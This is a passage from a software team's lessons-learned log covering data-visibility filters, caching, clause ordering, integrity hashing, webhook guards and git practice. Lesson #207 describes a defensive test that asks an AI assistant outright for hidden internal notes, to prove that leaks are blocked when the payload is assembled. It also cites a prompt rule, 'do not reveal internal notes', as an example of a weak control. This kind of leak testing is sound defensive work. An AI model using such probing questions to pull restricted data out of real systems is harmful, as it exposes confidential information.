When a feature feeds host data to an external boundary (guest AI context ← contract comments, Slice 3 / PR #133), the recon's deliverable is three findings, not a general survey: (a) the ONE already-filtered read path — `GuestInvitationService.readGuestVisibleComments`, which applies the binding wall (`findAccessibleContract`, 404-not-403), the `is_internal_note = false` WHITELIST, and the author-scrub projection ALL inside the DB query, so forbidden rows never leave the database; (b) confirmation the consumer can be wired to ONLY that path — `GuestChatService` injects the same-module service and its assembler stays a PURE function receiving already-filtered `GuestVisibleComment[]` (no repository access in the assembler), so nothing unfiltered CAN leak by construction; and (c) the NAMED dangerous path — `.leftJoinAndSelect('contract.comments', …)` on the shared walled read (`findForGuest`), which would load internal notes UNFILTERED and is shared with the guest viewer, so one "convenient" join would leak on two surfaces at once. Naming the dangerous path in the recon (and then in the service docs) is what keeps the next contributor from taking it. **The rule:** before building any sensitive-data-to-boundary feature, produce the recon triple — single filtered path found, consumer provably restricted to it, dangerous path named — and encode all three in the shipped code's comments; a filter that exists but sits beside an unnamed unfiltered alternative is one refactor away from a breach.

### Lesson #207 — A data-visibility boundary is enforced at CONTEXT ASSEMBLY, never left to the model — and you prove it with a question that explicitly asks for the forbidden data
An LLM must never be the enforcement point for a visibility boundary: a prompt instruction ("do not reveal internal notes") is a request to a text generator, not a control. The control is structural — the forbidden data is never IN the payload, because the assembly path is filtered. The PROOF technique (Slice 3's leak battery): ask the assistant a question that explicitly requests the forbidden content — "What concerns did the team raise privately? Are there any internal notes?" — alongside a generic question and a clause-specific one, and assert the serialized wire payload is IDENTICAL in leak-safety across all three (every internal sentinel absent regardless of phrasing). If the filter were prompt-dependent, the tempting question is exactly where it would crack; because the filter is at assembly, the payload cannot contain what the query never returned. **The rule:** for every boundary between sensitive data and a model, enforce at assembly (structural absence from the payload) and include a "tempting question" test that requests the forbidden data verbatim — asserting absence at the wire, not good behavior in the answer.

### Lesson #208 — Threading metadata is a leak vector: a visible reply threaded under an internal note leaks the note's existence/UUID unless the projection drops parent ids
Comment content filtering is not enough when comments THREAD: a guest's own (visible, `is_internal_note=false`) comment can be a reply whose `parent_comment_id` points at a host INTERNAL note. Project that field and the guest — or the AI payload — observes the internal note's UUID and its existence, even though its content never leaked (an existence oracle, the same class as the 404-not-403 rule). The guest-portal projection (`GuestVisibleComment`) deliberately does NOT carry `parent_comment_id` (a decision made in the feature-#1 comments list and inherited by the Slice-3 AI context for free, because the context consumes the SAME projection). The leak-battery proof: seed the guest's reply threaded UNDER the internal-general note and assert the note's UUID is absent from the entire serialized payload. **The rule:** when filtering rows by visibility, audit every RELATIONAL field in the projection (parent ids, thread roots, reply counts, "in reply to" labels) for existence leaks about filtered-out rows — and prove the scrub by seeding the cross-visibility relationship explicitly and asserting the forbidden row's identifier is absent from the output.

### Lesson #209 — Prove a visibility filter at BOTH layers: the fetch returns zero forbidden rows AND the forbidden sentinels are absent from the final output
A filter test at only one layer is a claim, not a proof. Output-only ("the payload contains no internal sentinels") can pass while the fetch is unfiltered — some later transformation happened to drop the rows, until it doesn't. Fetch-only ("the query returns no internal rows") can pass while a SECOND unfiltered fetch feeds the output. Slice 3 tests both layers explicitly: ⭐ FILTER-AT-SOURCE seeds all 6 comment-taxonomy rows (3 visible + 3 internal) and calls `readGuestVisibleComments` DIRECTLY, asserting exactly the 3 visible rows return (the whitelist is in the query); ⭐ the leak battery then asserts every internal sentinel is absent from the ENTIRE serialized ai-backend payload across all question shapes (the output is clean end-to-end). Belt AND suspenders — either alone leaves a gap the other closes. **The rule:** every visibility filter ships with a two-layer proof — a direct test of the filtered fetch against a DB seeded with forbidden rows, plus a full-output sentinel-absence test at the system boundary; and the output test serializes the WHOLE payload (`JSON.stringify` of everything crossing the boundary), not a cherry-picked field.

### Lesson #210 — A raw-QB aggregation endpoint lies to TypeScript three ways: getRawMany COUNT()s are STRINGS, grouped breakdowns are SPARSE, and wire fields can be UNDECLARED on the frontend type — verify shapes at the wire, then adapt explicitly
`GET /projects/:id/dashboard` (wired for the first time by 7.20 Slice 1's ProjectHealthBar, PR #132) returns its three breakdowns straight from TypeORM `getRawMany()`, which produces exactly the traps the recon predicted: **(1) every `count` field is a STRING** (raw PG `COUNT(*)` is bigint → text; `"3" × 45` silently NaN-poisons any math unless every count goes through `Number()`); **(2) the breakdown arrays are SPARSE** — `groupBy` emits only rows with count ≥ 1, so a project with no HIGH risks has NO `{risk_level:'HIGH'}` row at all (zero-fill a full LOW/MEDIUM/HIGH — and DRAFT/CHANGES_REQUESTED — record before computing, or a missing key reads `undefined`); **(3) `contracts.by_status` carries the RAW 12 `ContractStatus` values, NOT the 6 portfolio buckets** `StatusPie` expects — the 12→6 fold map (`CONTRACT_STATUS_BUCKETS`) exists backend-only in portfolio-analytics, so a frontend fold is REQUIRED before reusing StatusPie (deferred to the contracts-by-status slice; marked in the Dashboard-tab placeholder comment). A fourth trap is the same family from the other side: fields genuinely ON the wire can be missing from the frontend TS type — `GET /projects` returns `memberCount`/`contractCount` (via `loadRelationCountAndMap`) and `GET /contracts` returns `expiry_date`, yet neither is declared on the `Project`/`Contract` interfaces in `apps/sign/src/types/index.ts`; accessing them is a TS error even though the data is there. Slice 1 binds via a LOCAL type extension (`Contract & { expiry_date?: string | null }`) rather than widening the shared type mid-slice. All three landmines are unit-tested in `projectHealth.test.ts` (string-count, missing-HIGH-row, sparse by_status cases). **The rule:** when a frontend consumes a raw-QB endpoint for the first time, verify the shape at the wire (curl / live eval), never from the TS types — then handle string counts with `Number()`, zero-fill sparse grouped arrays, fold raw enums to display buckets explicitly, and bind wire-present-but-undeclared fields via a local type extension with a comment, so the shared type stays a deliberate change.

### Lesson #211 — 7.20 Slice 1 decisions: tabs are STATE (not URL routes) because no nested-route pattern exists under projects/:id, and the health formula lives as named tunable constants in a pure exported function
Two Slice-1 decisions future project-dashboard slices must not casually reverse. **(1) The ProjectDetailPage tab shell (Dashboard/Contracts/Parties & Team, Dashboard default) uses component tab STATE, not URL sub-routes** — `App.tsx` has only flat routes under `/app` (`projects/:id`, `projects/:id/permissions`, `projects/:id/obligations`); there is no nested-route/Outlet pattern under `projects/:id`, and inventing one for tabs would have been a new routing convention smuggled into a UI slice. Cost: tab position doesn't survive refresh/deep-link — if a future slice needs deep-linkable tabs, add routing as a DELIBERATE change, not a side effect. **(2) The health score is a PURE exported `computeProjectHealth(input)` in `apps/sign/src/components/project/projectHealth.ts` with every weight in a named `HEALTH_WEIGHTS` const** (risk HIGH×45/MED×18 cap 45; expired×25/expiring-30d×12/stalled-drafts×8 cap 30; overdue-obligations×4 cap 20; bands ≥80 healthy / ≥55 atRisk / else critical). The weights are an explicitly TUNABLE product decision — tune them in that one const, never inline in a component — and the pure-function split is what made red→green unit testing of the formula (15 cases incl. caps, clamping, drivers ordering) trivial. Related invariant: the insufficient-data guard (0 contracts OR 0 risk-analysis rows) returns a NEUTRAL "not enough analysed contracts" state, never a low/red score — a project that simply hasn't been analysed must not look critical. **The rule:** put derived-metric math in a pure exported function with named tunable constants (testable, tunable, reusable), and treat "tabs need URL routes?" as a routing-convention decision separate from the UI slice that wants tabs.

### Lesson #212 — A stored status column that lags reality must be filtered through the DERIVED-status helper at every consumer — a bare `status === 'OVERDUE'` filter silently undercounts
The `obligations.status` column only flips to OVERDUE when the backend reminder pass runs; until then an overdue obligation sits in the DB as PENDING or IN_PROGRESS with a past `due_date`. The UI-side truth is `effectiveStatus(status, due_date)` in `apps/sign/src/components/obligations/statusUtils.ts` (built in Phase 7.1 exactly for this), and every consumer that means "overdue" must go through it — the 7.20 Slice-2 attention zone derives its overdue feed with `effectiveStatus(...) === 'OVERDUE'` (`deriveOverdueObligations` in `components/project/attentionData.ts`), and the QA-seed verification proved the gap is real: 5 of the Critical project's 6 overdue obligations are stored PENDING; a bare status filter would have shown 1 instead of 6 with no error anywhere. The same class exists anywhere a stored state is refreshed by a scheduled job rather than at read time (contract expiry vs `expiry_date`, reminder tiers, staleness flags). Unit tests must pin BOTH directions: a PENDING row with a past due_date IS counted, and a COMPLETED/MET row with a past due_date is NOT (actioned things are never "overdue"). **The rule:** when a status column is maintained by a background pass, treat it as a CACHE of the truth, not the truth — every consumer filters through the shared derived-status helper, and the helper's landmine (stored-lag) gets an explicit test at each new consumer so a future "simplification" to the raw column fails loudly.

### Lesson #213 — Sibling components on the SAME React Query key share one cache entry — "lift the fetching to the parent" is usually unnecessary; identical queryKeys ARE the lift
7.20 Slice 2 added a second Dashboard-tab widget (ProjectAttentionZone) needing the exact three feeds ProjectHealthBar already fetches. The instinctive refactor — lift the three useQuery calls into ProjectDetailPage and pass data down as props — would have touched the health bar (risking its behaviour) for zero benefit: React Query already dedupes by queryKey, so the zone simply declares its own `useQuery` hooks on the SAME keys (`['project-dashboard', id]`, `['project-contracts', id]`, `['project-obligations', id]`) and reads the SAME cache entries — one network request per key, two consumers, no prop-drilling, no parent changes, and each widget keeps its own loading/error granularity (which the per-source-isolation requirement needed anyway). The precondition is EXACT key equality (same array shape and param values — `{project_id: id}` vs `{projectId: id}` in the queryFn doesn't matter, but the KEY array must match byte-for-byte). This is the same convention the codebase already banked for notifications (lesson #106) applied to data-heavy dashboard widgets. **The rule:** before lifting shared fetches to a parent, check whether sibling consumers can just repeat the same queryKey — with React Query, identical keys ARE the shared cache; lift only when a parent genuinely needs the joined data itself (e.g. to gate rendering), not to deduplicate requests.

### Lesson #214 — `order_index` numbers from 0 PER DOCUMENT, so a flat clause sort interleaves multi-document contracts — group by document priority FIRST, and share ONE ordering expression across every read that must match
The Risk-tab rework (PR #137) needed the Risk tab to list clauses in the SAME order as the Clauses tab. The Clauses tab used `getContractClauses` with a bare `order: { order_index: 'ASC' }` — which looked fine on single-document contracts but SILENTLY interleaved multi-document ones, because `writeClausesInTx` assigns `order_index` starting at 0 for EACH document's extraction. So a 3-file contract had three clauses at `order_index=0`, three at `1`, … and the flat sort produced doc1[0], doc2[0], doc3[0], doc1[1], … instead of each file's clauses grouped. The fix: order clause-scoped reads by the source document's priority FIRST — `document_priority` (unset/0 sorts LAST) → document `created_at` (upload-order fallback) → `order_index` (position within the document) → id — expressed via a QueryBuilder that LEFT-JOINs `clause.source_document` (so a clause with no document sorts last, never dropped). CRITICAL: the risk read (`RiskAnalysisService.getByContract`) and the clause read (`ContractsService.getContractClauses`) now use the **byte-identical** expression — they are ONE source of truth. If only one had been changed, the two tabs would disagree on multi-doc contracts. **The rule:** any per-document sequence number (order_index, page number, chunk index) that restarts per source is NOT a global sort key — group by the document first; and when two surfaces must render the same order, factor the ordering into one shared expression, never two hand-copied ORDER BYs that can drift.

### Lesson #215 — A NULL foreign key used as an isolation mechanism must be RESTORED on the state transition that ends the isolation — else the row silently leaves the group it belongs to
The AI clause-rewrite proposal (PR #137) is deliberately created with `source_document_id = NULL` — that NULL is the ISOLATION mechanism: the guest document-scoped panel query (`clause.source_document_id = :docId`) can never match it, so an AI proposal never shows up in the guest "proposed versions" list. Correct and verified. But promotion (Merge & Apply) left the promoted clause's `source_document_id` NULL — and the Risk/Clauses tabs group + order by `source_document_id`, so after every merge the clause AND all its risks fell out of their file section ("General Conditions") into a null-source "Document" fallback group. A human caught it in the browser. The fix is one line — on promotion, `propClause.source_document_id = original.source_document_id` — but the LESSON is the shape: when a nullable FK does double duty as an isolation flag ("NULL = not yet attached / not visible here"), the transition that makes the row "real" (promotion, publish, approve) MUST re-populate that FK from its canonical parent, or the row disappears from every query keyed on it. Position metadata (`section_number`/`order_index`) did NOT need copying because the original **junction row was reused** (only its `clause_id` repointed) — a reminder to know which columns live on the junction vs the entity. Prove BOTH halves in tests: while proposed the FK is NULL (isolation) AND after promotion it equals the parent's (grouping). **The rule:** a NULL-as-isolation FK needs a matching "un-isolate" write on the promoting transition; grep every read that filters/groups on that column and confirm the row lands where it should in BOTH states.

### Lesson #216 — Never run the full real-Postgres test suite concurrently with manual DB transactions on the SAME dev database — the races produce phantom failures that look like code defects
During the PR #137 work a full backend run reported `4 failed, 1243 passed`, in a suite that had been green minutes earlier — because a manual verified-cleanup transaction (deleting AI_DRAFTED clauses, updating `risk_analyses`) was run on the shared dev Postgres WHILE the real-PG specs (apply-proposed-version, annotate-risk, proposed-leak-fix, …) were still seeding/querying those same tables. The concurrent writes (and the transaction's locks) raced the tests → 4 false failures. A clean re-run with no concurrent DB activity was `1247 passed, 0 failed`. The tell that it was infra, not code: the ONLY code change was in `applyRephrase`, whose own spec was 12/12 green — a real break would surface in that spec first, not in four unrelated real-PG suites. **The rule:** the dev Postgres is shared state; the real-PG suite assumes it owns it for the run. Do manual DB surgery (cleanups, migrations, spot-checks that WRITE) EITHER before the suite starts or after it finishes — never overlapping. When a previously-green real-PG suite shows a small, scattered set of failures right after you touched the DB, re-run clean before believing them.

### Lesson #217 — A live smoke test that mutates real corpus data is only safe with a pre-captured, verified revert plan — capture identities + content hashes BEFORE, prove byte-identity + zero orphans AFTER
The PR #137 end-to-end smoke test exercised the real AI rewrite → merge on a real Arabic contract (Muhlbauer), which PERMANENTLY promoted a clause (parent-chain) and flipped risk state — on the annotation corpus that Phase 8.3 depends on. It was reverted cleanly only because the revert was planned as data: BEFORE the test, capture the exact ids in play (original clause, junction, AI clause, risk) and the original clause's `md5(content)`; the merge only sets `is_active=false` + repoints the junction (never mutates the original's content), so revert = repoint junction back, reactivate original, delete the AI clause, clear `merged_at` + proposed links + any status the "mark handled" checkbox changed (APPROVED→OPEN). AFTER, prove it with queries, not assumption: original `md5` byte-identical to the pre-capture, live junction resolves to the original, zero `AI_DRAFTED` clauses / zero `is_proposed` junctions / zero orphans platform-wide, and the total clause count back to the known baseline (508). A second gotcha: a full test suite running concurrently means the revert transaction races it (lesson #216) — sequence them. **The rule:** treat any corpus-mutating live test like a database migration you intend to roll back — pre-capture identities + content hashes, script the inverse of every write (including side-effects like status changes and generated-but-unmerged proposals), and verify restoration with counts + hashes + an orphan sweep, never "it looked fine."

### Lesson #218 — When a backend constant can't be imported by the frontend, MIRROR it with a source-of-truth pointer AND per-entry parity tests — a named test per mapping turns silent drift into a loud failure
The 12→6 contract-status fold (`CONTRACT_STATUS_BUCKETS`, Phase 7.17 D1) lives inside `backend/src/modules/portfolio-analytics/portfolio-analytics.service.ts` — a Nest service importing backend entities, in a package that is deliberately OUTSIDE the npm workspace (own lockfile, per the Phase 2.4 CI design). The frontend's contracts-by-status widget (7.20 Slice 3) needs that exact mapping, and there were only two honest options: create a NEW shared package (an architectural change far bigger than a dashboard widget — new workspace member, backend build changes, team decision) or mirror the constant. The slice mirrors it as `PROJECT_CONTRACT_STATUS_BUCKETS` in `apps/sign/src/components/project/dashboardAnalytics.ts` with THREE drift defenses: (1) a comment naming the backend file as the SOURCE OF TRUTH and requiring same-PR replication of any change; (2) an `it.each` parity test asserting EVERY one of the 12 mappings individually — so if the backend map ever changes, the frontend fails a test NAMED after the exact status that drifted, not a vague aggregate; (3) a key-count test (exactly 12) so an added 13th status fails loudly too, mirroring the backend's own Record<ContractStatus, …> compile-time exhaustiveness. Also mirrored the behavioural edge: unknown status → DRAFT, same as `bucketContractStatus()`. **The rule:** mirroring a cross-package constant is acceptable ONLY with the full defense kit — source-of-truth pointer comment, per-entry named parity tests, and an exhaustiveness check; if you find yourself mirroring something that changes often or has real logic (not a static map), stop and make the shared-package case to the team instead.

### Lesson #219 — A misleading handled error is worse than a crash: a permanent failure surfaced as "please try again" sends the user down a path that can never succeed
When a real SIGN customer (an existing MANAGING account) was invited as a guest and tried to establish guest identity, the guest-scoped race-guard lookup (`email + account_type=GUEST`) missed their row, the create hit `UQ_users_email`, and the raw `QueryFailedError` fell through the global filter as a 500 — which the modal displayed as the generic RETRYABLE copy ("Could not set your password just now. Please try again."). Every retry produced the same wall, forever: the user was told the failure was transient (false), sent down the retry path (wrong), and the real cause — an unmodeled identity collision between the guest flow and a real account — stayed invisible to user and triage alike. A wrong-but-plausible error is WORSE than an honest crash, because it actively misdirects. (Triage meta-gotcha from the same incident: an earlier session REPORT claimed the failure was a 400 "invitation email does not match your account" — a message that exists nowhere in the codebase; the claim propagated across three planning docs before a grep killed it.) The fix (Slice 0, PR #139): detect the non-GUEST collision BEFORE the insert → handled 409 `EXISTING_ACCOUNT_EMAIL` + honest frontend copy that names the real situation and does NOT promise the unbuilt sign-in path. **The rule:** when triaging "the user sees an error," verify the error is TRUE — right cause, right permanence, right next step — not merely that a response is returned; and verify claimed error messages against the codebase (grep the literal string) before planning around them.

### Lesson #220 — Frontend error copy keys on the error CODE, not the backend message — a beautifully-worded backend message is never seen
The guest establish-identity UI (and the guest upload/chat surfaces before it) maps `err.response.data.error` — the machine CODE — to a LOCAL i18n string; the backend's `message` field is never rendered. So when Slice 0 added the graceful 409, writing a careful human message into the `ConflictException` body changed nothing on screen: the modal's 409 branch keyed on status alone and showed the OLD conflict copy ("the password did not match — use the original password"), actively false for the real-account case. The fix pairs every new backend error code with a frontend i18n entry keyed on that code (`EXISTING_ACCOUNT_EMAIL` → `guest.identity.errors.existingAccount`, en/ar/fr in the same commit per the i18n parity rule), with the status-only branch kept as the fallback for uncoded 409s. The backend message still matters — it serves API consumers, logs, and tests — but it is NOT the user-facing copy. **The rule:** adding a backend error means adding the matching FRONTEND i18n entry keyed on the CODE (all three locales, same commit) and a branch that reads `err.response.data.error`; if you only wrote backend copy, the user is seeing a generic or wrong fallback — find the error-display component and trace what it actually keys on.

### Lesson #221 — COMMIT + PUSH the feature branch BEFORE stopping for review — an unreviewed artifact that exists only in a working tree is one session-loss away from never existing
The first Slice 0 build was built and tested, then STOPPED for human review per the gate — leaving everything as uncommitted changes in an ephemeral environment. The session's environment did not survive to the next session, and the work was UNRECOVERABLE: an exhaustive forensic sweep (reflog, fsck dangling objects, stashes incl. untracked third parents, every clone on the machine, editor local history, session transcripts) found zero trace, and the slice had to be rebuilt from scratch. Worse, the LOST session's claimed findings (a specific error message that turned out not to exist) kept steering subsequent planning with no artifact to check them against. The durability fix costs nothing and preserves every review gate: after tests pass, `git add` the slice files by EXPLICIT path (never `git add .` — the main tree carries deliberately-local files), commit with the full context in the message, and `git push -u origin <branch>` BEFORE stopping. Review then happens against recoverable code on origin — the reviewer can diff, check out, or discard it, but it cannot evaporate; and "do not open the PR yet" remains fully compatible with a pushed branch. **The rule:** "stop for review" NEVER means "leave the work uncommitted" — the artifact goes durable on origin first (explicit-path commit + push), and any verification claim in a handoff must point at a SHA that `git ls-remote` can confirm exists.

### Lesson #222 — Design-export placeholders can ship as literal code: replace mockup stand-ins (logos, avatars, sample copy) with the real shared components when building from an export
A Claude Design mockup used a placeholder letter-box (a white "S" in a rounded square) for the brand logo; when the screen (HostReviewMergeScreen, the 2c review UI) was built from that export, the placeholder was copied verbatim instead of wiring the real shared logo component (SignLogo/BloomAppIcon) — leaving one screen off-brand while every other brand surface (sidebar, admin rail, auth pages, guest portal, chat panels, favicon/app-icon) was correct. It survived unnoticed because a placeholder that RENDERS is easy to miss: it "looks intentional" — it had the brand-ish color, the right size, the right framing, and no error anywhere. Found only when a human compared the header against the brand mark. The fix (PR #145, `615e48e`) is one line — `<BloomAppIcon size={28} />` in place of the S-box div — because the real mark already existed as a component implementing the brand sheet exactly. **The rule:** when building from a design export, sweep the mockup's stand-ins (logos, avatars, lorem copy, fake data) and replace each with the real shared component before shipping; after the build, audit brand/asset surfaces against the shared component (`grep` for inline brand-colored boxes / single-letter renders) — a rendering placeholder produces no error, so only a deliberate audit catches it.

### Lesson #223 — An integrity hash must be computed from ONE canonical serializer, never from a Postgres-round-tripped object — jsonb does not preserve key order, so the same "record" hashes differently after a DB write
The signed-state pin (PRs #141/#142) freezes a contract's legal content as a SHA-256 over its clause set + substantive metadata. The trap: if you hash `JSON.stringify(rowFromDb)`, the hash silently depends on JS property-insertion order AND on how Postgres `jsonb` reordered the keys on the way back out — `jsonb` preserves ARRAY order (which carries the clause ordering, so that survives) but does NOT preserve OBJECT key order, so a pin computed at write-time and re-verified after a round-trip would mismatch for a byte-identical document. The fix is a single canonical serializer (`canonical-pin.util.ts` `buildPinPayload` + `sha256`) that (a) serializes object keys in SORTED order recursively, (b) normalizes values to a stable form before hashing — decimals→strings (TypeORM returns `numeric` as string), dates→`'YYYY-MM-DD'` — so live-recompute and stored-payload-recompute agree, and (c) is used at BOTH pin time and verify time (`verifyContractPin` recomputes the hash from the live content AND from the stored `pin_payload`; any mismatch = tamper/drift, logged loudly). The freeze set is SUBSTANTIVE LEGAL CONTENT only (name, type, parties, values, dates, clause section/title/content/order) — volatile operational fields (status, signature_status, envelope id, timestamps, user ids, annotation-tracking) are deliberately EXCLUDED so the hash isn't perturbed by the legitimate churn that happens during and after signing. **The rule:** compute an integrity hash from a purpose-built canonical serializer (recursively sorted keys + normalized scalar forms), never from a `JSON.stringify` of a DB-round-tripped row; hash the SAME serializer's output at write time and verify time; and hash only the fields that are supposed to be immutable, excluding operational fields by design.

### Lesson #224 — When two independent triggers cause the same state change, funnel BOTH through one shared operation — or their behavior WILL drift
Executing a contract can happen via two doors: the DocuSign `completed` webhook, and a new manual `POST /contracts/:id/mark-signed` for wet-signed paper (PR #141). Before pinning, only DocuSign existed and it set `FULLY_EXECUTED` via a bare `contractRepo.save()` — it never took a version snapshot or computed a pin. Adding a second door naively (its own save + its own snapshot) would have guaranteed the two paths diverge over time: one computes a hash, the other forgets; one audits the actor, the other doesn't; a later change to the freeze rules gets applied to one door only. The fix routes BOTH doors through a single `ContractPinningService.pinExecutedContract` — one transaction with a pessimistic row lock, idempotent (exactly-once pin under DocuSign redelivery or a mark-signed double-submit), one audit record that captures WHICH door and WHICH actor. The doors differ only in their preconditions (the webhook trusts the envelope; mark-signed rejects DRAFT / mid-approval / terminal states); the freeze itself is one code path. **The rule:** if a domain transition has more than one entry point (webhook + manual, UI + API, sync + async), the transition's substance (snapshot, hash, audit, side effects) belongs in ONE shared operation both callers invoke — the entry points may differ in preconditions and authz, but never in what the transition actually does.

### Lesson #225 — Enforce a mutation invariant at the SERVICE seam, not a controller guard, when non-HTTP writers exist — a controller guard silently misses the scheduler, the webhook, and poll-driven writers
Pinning enforcement (PR #142) had to reject every legal-content mutation on a frozen contract. A NestJS controller guard (`@UseGuards`) was the obvious reach and would have been WRONG: several writers that mutate clauses never pass through a controller — the SYSTEM extraction driver (`advanceDocumentState`, a Bull-scheduler-run path with no HTTP request, lesson #182), poll-driven proposed-clause promotion, the shared managing+guest upload seam, and webhook internals. A controller guard protects only request-bound writes and would leave every background path free to mutate a signed contract. Instead the guard is a pure, transaction-aware util (`contract-pin-guard.util` `assertContractMutable` / `assertClauseMutable`, taking an explicit `EntityManager`) wired at the SERVICE seam of ~16 write paths — including the non-HTTP ones, where a pinned contract's in-flight extraction is terminalized (FAILED, error names `CONTRACT_PINNED`) and its metering reservation refunded rather than throwing into a scheduler. (Secondary reason it's a util, not a DI service: the natural DI home already injects `ContractsService`, so injecting the guard back would be a DI cycle, and a new constructor dep would churn every positional-arg spec instantiation — a pure function is the least-invasive correct seam.) **The rule:** place a mutation invariant where the WRITES converge (the service/data seam), not where the HTTP requests converge (the controller); enumerate every writer — schedulers, queue processors, webhook handlers, poll-driven promoters — before deciding the guard's altitude, because the ones that skip the controller are exactly the ones a controller guard fails to protect.

### Lesson #226 — A late or replayed "revert" webhook must be a STATUS-GUARDED no-op — an unconditional revert can un-sign an already-signed contract
DocuSign sends `declined` / `voided` webhooks, and pre-pinning they reverted the contract to a pre-signed state via a straight save. Once execution became a hash-pinned freeze, that unconditional revert became dangerous: DocuSign can redeliver, and events can arrive out of order, so a void for an envelope that was later completed (or a replayed old void) would happily UN-SIGN a fully-executed, pinned contract — destroying the legal freeze. The fix (PR #141) makes void/decline a STATUS-GUARDED conditional UPDATE: it only reverts an envelope that is still pending; a void arriving AFTER completion is audited and IGNORED (the pin survives untouched). The guard is the current state, checked atomically in the UPDATE's WHERE clause, not read-then-write. **The rule:** any webhook/event handler that moves state BACKWARD (revert, cancel, void, refund) must gate on the current state in the same atomic write — never unconditionally revert — because at-least-once delivery + out-of-order events mean a stale "undo" will eventually arrive after the thing it would undo has become final.

### Lesson #227 — Order the checks: cross-tenant is 404 (no existence leak) BEFORE same-org-but-blocked is a distinct coded 409 — collapsing them either leaks existence or hides the reason
The pin enforcement guard returns a coded `409 CONTRACT_PINNED` for a mutation on a frozen contract (the `GUEST_UPLOAD_DAILY_LIMIT` / `EXISTING_ACCOUNT_EMAIL` coded-envelope precedent). Critically, that 409 must fire ONLY for a contract the caller can already see — so the guard runs strictly AFTER the tenancy wall (`findInOrg` / `findForGuest` / scoped load). If the pin check ran first, a cross-org attacker probing a random contract id would get `CONTRACT_PINNED` instead of `404`, leaking that the contract EXISTS and is signed. Two different facts deserve two different answers: "you can't see this" → 404 (existence not leaked); "you can see this but it's frozen" → 409 with the machine-readable code the frontend keys on (lesson #220). Collapsing them in either direction is a bug — a shared 403/404 hides the actionable pin reason from a legitimate user, and a pin-first order leaks existence to an attacker. **The rule:** when a resource has both a visibility gate and a state gate, always evaluate visibility FIRST (unauthorized → the same not-found answer as a nonexistent id), and only then the state gate as a distinct coded error — the ordering IS the security boundary, not just ergonomics.

### Lesson #228 — Pin an immutable record PER-VERSION (payload on the version row + pointer on the parent), not flat on the parent — it leaves room for amendment/re-execution without destroying prior signed records
The signed-state freeze stores its hash + full canonical payload on the `contract_versions` row (`content_hash` + `metadata.pin_payload`) and puts only POINTERS on the contract (`pinned_version_id`, `pinned_at`, `pinned_content_hash`, FK `ON DELETE RESTRICT`). The tempting shortcut — one `pinned_hash` column flat on the contract — would have worked for v1's single execution but painted the schema into a corner: a future amendment or re-execution flow would have to OVERWRITE the single column, destroying the prior signed record, to pin the new one. With the per-version design, an amendment pins a NEW version's row and the contract pointer simply moves; every historically-signed version keeps its own immutable frozen record, and the `ON DELETE RESTRICT` FK prevents a version-history prune from silently orphaning the active pin. The forward-compatibility cost was near-zero (the version row already existed as the snapshot target). **The rule:** when freezing "the record as of an event," attach the frozen payload to the row representing THAT event/version and keep only a pointer on the parent — so repeating the event (amend, re-sign, re-issue) adds a new frozen record instead of overwriting the last one, and history stays provable.

### Lesson #229 — A self-referential hierarchy FK uses ON DELETE RESTRICT, not SET NULL — a parent with children must not be silently orphaned
T0b added `contracts.parent_contract_id` (a self-referential FK `contracts → contracts`). The codebase's existing self-ref template — `LegalDocument.parent_law_id` — uses `ON DELETE SET NULL`, and copy-pasting that cascade here would have been WRONG: a legal document losing its parent-law pointer is harmless metadata, but a CHILD CONTRACT losing its parent link silently breaks the delivery-chain hierarchy — the child becomes a rootless orphan with no signal that its parent ever existed. T0b diverged deliberately to `ON DELETE RESTRICT`, so deleting a parent that still has children is BLOCKED at the database (verified `confdeltype = 'r'`; a real-PG test asserts the delete rejects rather than silently NULLing). The divergence is spelled out in the migration + entity comments so the next self-FK author picks the cascade by INTENT, not inheritance. **The rule:** choose a self-referential FK's `ON DELETE` by what the link MEANS — `SET NULL` only when losing the pointer is harmless, `RESTRICT`/`CASCADE` when an orphan is corruption — never inherit the cascade from a copied template without re-deriving it, and prove the choice with a delete-a-parent-that-has-children test.

### Lesson #230 — A create-path guard can be correct and worth keeping even when it cannot fire at create time — don't "simplify it away"
T0b's parent-link validation includes a self/cycle guard (a full parent-chain walk, depth-capped at 64). On the v1 create-time-only path it is STRUCTURALLY unreachable for the obvious case: a brand-new contract has no id yet, so nothing can point back to it — a self-parent or an A→B→A cycle cannot form on create (and the current registry, where children point only to a parentless MAIN, makes cycles impossible regardless). The tempting move is to delete it as dead code. It earns its place anyway: it rejects CREATING a child under a parent whose EXISTING ancestry is already corrupt (a self-loop or reciprocal forced by bad data — real-PG tests seed exactly that via raw SQL and `create()` rejects), it bounds chain depth against pathological data, and it threads an optional `selfId` so it is already correct the day an editable-parent slice lands (where the self/cycle case IS reachable). The code + PR say honestly that it cannot fire through `create()` today. **The rule:** before deleting a guard as "unreachable," separate structurally-impossible-TODAY from impossible-FOREVER — a guard that defends against pre-existing corrupt data, bounds a walk, and is ready for a near-future reachable path is cheap insurance, not dead code; keep it and DOCUMENT why it can't currently fire.

### Lesson #231 — ContractsService.create() maps fields EXPLICITLY (never spreads the DTO) — a newly persisted column must be added to the create() literal or it silently drops
`create()` builds the entity with an explicit field-by-field object literal, and carries an in-code comment warning that a field added only to the DTO would silently never persist. Adding `parent_contract_id` to `CreateContractDto` alone would have validated the input but NEVER written it — the column stays NULL, no type error, no runtime error, the frontend "sent it," and only a DB read reveals the drop. The fix is one line: map `parent_contract_id` in the `create()` literal next to `relationship_type`. Because the failure is SILENT (mock-repo unit tests and `tsc` both stay green while the column stays null), the real guard is a persistence test that RELOADS the row from real Postgres and asserts the value survived (T0b's ⭐ test creates a SUBCONTRACT with a parent, then re-reads `parent_contract_id` from the DB). **The rule:** in any service that maps DTO→entity by explicit assignment (not object spread), adding a DTO field is only HALF the change — the service must map it too — and prove it with a test that reloads the row from the database, because a mocked-repo test and a typecheck both pass while the column silently stays null.

### Lesson #232 — `git diff --stat main...branch` compares against LOCAL main, which lags origin after a merge — doc files or a huge diff can be a stale-baseline artifact, NOT pollution
